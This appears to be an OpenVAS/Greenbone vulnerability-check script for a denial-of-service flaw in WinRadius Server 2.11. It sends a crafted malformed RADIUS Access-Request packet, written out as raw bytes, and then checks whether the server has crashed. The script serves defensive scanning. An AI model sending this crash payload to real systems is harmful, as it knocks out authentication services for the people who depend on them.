if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803716" );
	script_version( "2021-08-05T12:20:54+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_tag( name: "last_modification", value: "2021-08-05 12:20:54 +0000 (Thu, 05 Aug 2021)" );
	script_tag( name: "creation_date", value: "2013-06-12 12:06:46 +0530 (Wed, 12 Jun 2013)" );
	script_name( "WinRadius Server Denial of Service Vulnerability" );
	script_xref( name: "URL", value: "http://1337day.com/exploit/20879" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2013060100" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/121982" );
	script_xref( name: "URL", value: "http://www.iodigitalsec.com/blog/fuzz-to-denial-of-service-winradius-2-11" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "radius_detect.sc" );
	script_require_udp_ports( "Services/udp/radius", 1812 );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to cause a
  denial of service." );
	script_tag( name: "affected", value: "WinRadius Server version 2.11." );
	script_tag( name: "insight", value: "The flaw is due to an error when parsing Access-Request packets
  and can be exploited to crash the server." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one." );
	script_tag( name: "summary", value: "The host is running WinRadius Server and is prone to denial of
  service vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "exploit" );
	exit( 0 );
}
require("network_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = service_get_port( default: 1812, proto: "radius", ipproto: "udp" );
if(!check_udp_port_status( dport: port )){
	exit( 0 );
}
if(!is_radius_alive( port: port )){
	exit( 0 );
}
if(!soc = open_sock_udp( port )){
	exit( 0 );
}
req = raw_string( 0x01, 0xff, 0x00, 0x2c, 0xd1, 0x56, 0x8a, 0x38, 0xfb, 0xea, 0x4a, 0x40, 0xb7, 0x8a, 0xa2, 0x7a, 0x8f, 0x3e, 0xae, 0x23, 0x01, 0x06, 0x61, 0x64, 0x61, 0x6d, 0x02, 0xff, 0xf0, 0x13, 0x57, 0x7e, 0x48, 0x1e, 0x55, 0xaa, 0x7d, 0x29, 0x6d, 0x7a, 0x88, 0x18, 0x89, 0x21 );
send( socket: soc, data: req );
close( soc );
if(!is_radius_alive( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

